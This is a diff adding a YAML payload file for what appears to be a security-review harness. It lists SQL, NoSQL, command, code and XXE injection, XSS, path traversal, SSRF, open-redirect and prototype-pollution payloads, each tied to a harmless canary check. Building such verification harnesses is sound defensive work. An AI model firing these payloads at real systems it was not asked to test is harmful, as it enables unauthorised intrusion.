@@ -1,0 +1,105 @@
+# Exploit oracles shared by every harness (python/, node/, java/).
+#
+# A harness sends each payload to the injection point and evaluates `check`:
+#   differential  - vulnerable if any payload response differs from the benign response (2xx/3xx only)
+#   reflect       - vulnerable if the marker appears unescaped in the response body
+#   marker        - vulnerable if `marker` (a computed value, never the literal payload) appears in the body
+#   file_canary   - vulnerable if the canary file was created by the request
+#   read_canary   - vulnerable if the secret content of a canary file appears in the response
+#   ssrf_canary   - vulnerable if the harness's local canary HTTP server received a request
+#   redirect      - vulnerable if the response redirects to the attacker host
+#   proto         - vulnerable if Object.prototype was polluted (Node, in-process)
+# Placeholders filled by the harness: {CANARY_FILE} {CANARY_DIR} {CANARY_URL} {TOKEN}
+#
+# "blocked" = every payload failed. "error" = the endpoint could not be exercised (e.g. 401/404/500
+# for the benign request too), which makes the PoC inconclusive.
+
+sqli:
+  check: differential
+  benign: "secreview_nomatch_{TOKEN}"
+  payloads:
+    - "secreview_nomatch_{TOKEN}' OR '1'='1"
+    - "secreview_nomatch_{TOKEN}' OR '1'='1' -- "
+    - "secreview_nomatch_{TOKEN}\" OR \"1\"=\"1"
+    - "0 OR 1=1"
+    - "secreview_nomatch_{TOKEN}') OR ('1'='1"
+
+nosqli:
+  check: differential
+  benign: "secreview_nomatch_{TOKEN}"
+  json_payloads:
+    - {"$ne": "secreview_nomatch_{TOKEN}"}
+    - {"$gt": ""}
+    - {"$regex": ".*"}
+  query_payloads:            # appended as param[$ne]=... for query-string injection points
+    - ["$ne", "secreview_nomatch_{TOKEN}"]
+    - ["$gt", ""]
+  payloads:
+    - "'; return true; var x='"
+
+xss:
+  check: reflect
+  marker: "<script>secreview_xss_{TOKEN}()</script>"
+  payloads:
+    - "<script>secreview_xss_{TOKEN}()</script>"
+    - "\"><script>secreview_xss_{TOKEN}()</script>"
+
+cmdi:
+  check: marker_or_file
+  marker: "secreview-42-{TOKEN}"
+  payloads:
+    - "x; echo secreview-$((6*7))-{TOKEN}"
+    - "x && echo secreview-$((6*7))-{TOKEN}"
+    - "x | echo secreview-$((6*7))-{TOKEN}"
+    - "$(echo secreview-$((6*7))-{TOKEN})"
+    - "x; touch {CANARY_FILE}"
+    - "x && touch {CANARY_FILE}"
+    - "x & echo secreview-42-{TOKEN}"
+
+code_injection:
+  check: file_canary
+  payloads_python:
+    - "__import__('pathlib').Path(r'{CANARY_FILE}').touch()"
+    - "1;__import__('pathlib').Path(r'{CANARY_FILE}').touch()"
+  payloads_node:
+    - "require('fs').writeFileSync('{CANARY_FILE}','x')"
+    - "process.mainModule.require('fs').writeFileSync('{CANARY_FILE}','x')"
+  payloads_java:
+    - "T(java.nio.file.Files).createFile(T(java.nio.file.Paths).get('{CANARY_FILE}'))"
+
+path_traversal:
+  check: read_canary
+  payloads:
+    - "../../../../../../../../../..{CANARY_FILE}"
+    - "{CANARY_FILE}"
+    - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..{CANARY_FILE}"
+    - "....//....//....//....//....//....//....//....//{CANARY_FILE_NOSLASH}"
+
+ssrf:
+  check: ssrf_canary
+  payloads:
+    - "{CANARY_URL}/secreview-ssrf"
+    - "http://localhost:{CANARY_PORT}/secreview-ssrf"
+
+open_redirect:
+  check: redirect
+  attacker_host: "secreview-evil.example"
+  payloads:
+    - "https://secreview-evil.example/{TOKEN}"
+    - "//secreview-evil.example/{TOKEN}"
+    - "/\\secreview-evil.example/{TOKEN}"
+
+xxe:
+  check: read_canary
+  content_type: application/xml
+  payloads:
+    - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://{CANARY_FILE}\">]><r>&x;</r>"
+
+prototype_pollution:
+  check: proto
+  property: "secreviewPolluted{TOKEN}"
+  json_payloads:
+    - {"__proto__": {"secreviewPolluted{TOKEN}": "yes"}}
+    - {"constructor": {"prototype": {"secreviewPolluted{TOKEN}": "yes"}}}
+  payloads:
+    - "__proto__"
